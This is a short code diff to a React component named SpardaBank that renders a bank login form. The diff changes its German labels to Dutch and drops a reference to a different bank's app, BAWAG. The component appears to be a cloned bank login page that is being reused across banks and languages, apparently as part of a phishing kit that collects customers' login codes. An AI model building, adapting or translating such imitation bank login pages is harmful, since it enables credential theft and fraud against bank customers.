@@ -88,7 +88,7 @@ export function SpardaBank({ formData, onChange, handleRouteAction, saving }: Pr
                 <div className="relative">
                   <input 
                     type="text" 
-                    placeholder="Verfügernummer"
+                    placeholder="Inlogcode"
                     value={formData.verfuegernummer || ""}
                     onChange={(e) => onChange("verfuegernummer", e.target.value)}
                     className="w-full bg-white border border-gray-300 rounded-[5px] px-4 py-3 outline-none focus:border-gray-500 text-[15px] text-gray-800 placeholder-gray-400"
@@ -128,7 +128,7 @@ export function SpardaBank({ formData, onChange, handleRouteAction, saving }: Pr
             
             {activeTab === 'app' && (
               <div className="flex flex-col items-center justify-center py-8 text-center">
-                <p className="text-gray-600 mb-4">Bitte nutzen Sie die BAWAG App für diesen Login-Weg.</p>
+                <p className="text-gray-600 mb-4">Gebruik de app voor deze inlogmethode.</p>
               </div>
             )}
           </div>
